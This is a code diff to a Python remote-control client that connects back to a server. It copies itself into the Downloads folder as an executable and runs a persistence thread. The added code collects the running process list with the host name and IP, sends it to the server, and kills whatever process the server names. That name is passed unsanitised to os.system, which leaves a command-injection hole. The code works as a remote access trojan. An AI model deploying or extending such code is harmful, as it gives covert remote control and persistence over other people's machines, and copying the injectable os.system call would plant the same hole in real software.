@@ -159,6 +159,58 @@ class Client:
                     subprocess.call([r"C:\Program Files (x86)\AnyDesk\anydesk.exe"])
                     continue
 
+                # Task List
+                elif (str(command.lower())) == "tasks":
+                    chunk = 1000000
+                    self.d = datetime.now().replace(microsecond=0)
+                    self.dt = str(self.d.strftime("%b %d %Y %I.%M.%S %p"))
+                    self.tasksfile = rf"c:\Users\{os.getlogin()}\Desktop\tasks " \
+                                     rf"{self.hostname} {str(self.localIP)} {self.dt}.txt"
+
+                    sysinfo = open(self.tasksfile, 'w')
+                    sinfo = subprocess.call(['tasklist'], stdout=sysinfo)
+                    sysinfo.write("\n")
+                    sysinfo.close()
+                    soc.send(f"{self.tasksfile}".encode())
+
+                    with open(self.tasksfile, 'r') as file:
+                        for line in file.readlines():
+                            task_list.append(line)
+
+                    for t in task_list:
+                        print(t)
+
+                    time.sleep(2)
+                    sysinfo = open(self.tasksfile, 'r')
+                    while True:
+                        data = sysinfo.read(chunk)
+                        soc.sendall(data.encode())
+
+                        if not data:
+                            sysinfo.close()
+                            break
+
+                        # soc.shutdown(1)
+                    msg = soc.recv(1024).decode()
+                    print(f"@Server: {msg}")
+                    soc.send(f"@{self.hostname} | {self.localIP}: Task List Sent Sent.\n".encode())
+                    os.remove(self.tasksfile)
+
+                    try:
+                        # Kill Task
+                        kill = soc.recv(1024).decode()
+                        if str(kill) == "kill":
+                            task2kill = soc.recv(1024).decode()
+                            os.system(f'taskkill /IM {task2kill} /F')
+                            soc.send(f"Task: {task2kill} Killed.".encode())
+                            break
+
+                        else:
+                            continue
+
+                    except (ConnectionResetError, ConnectionAbortedError):
+                        break
+
                 # Restart Machine
                 elif str(command.lower()[:7]) == "restart":
                     self.d = datetime.now().replace(microsecond=0)
@@ -196,17 +248,24 @@ def run_powershell(cmd):
     return completed
 
 
+def window_enumeration_handler(hwnd, top_windows):
+    # Add windows to list
+    top_windows.append((hwnd, win32gui.GetWindowText(hwnd)))
+
+
 if __name__ == "__main__":
+    task_list = []
+    top_windows = []
     script_path = os.path.realpath(__file__)
     script_file_name = os.path.basename(script_path)
     target_path = fr"c:\Users\{os.getlogin()}\Downloads\{str(script_file_name).replace('py', 'exe')}"
     shutil.copyfile(script_path, target_path)
     persistence_thread = threading.Thread(target=persistence,
-                                          args=(1, ), name='Persistence Thread')
+                                          args=(1,), name='Persistence Thread')
     persistence_thread.start()
 
     port = 55400
-    servers = [('192.168.1.10', port)]
+    servers = [('Server-IP', port)]
     while True:
         for server in servers:
             client = Client(server)
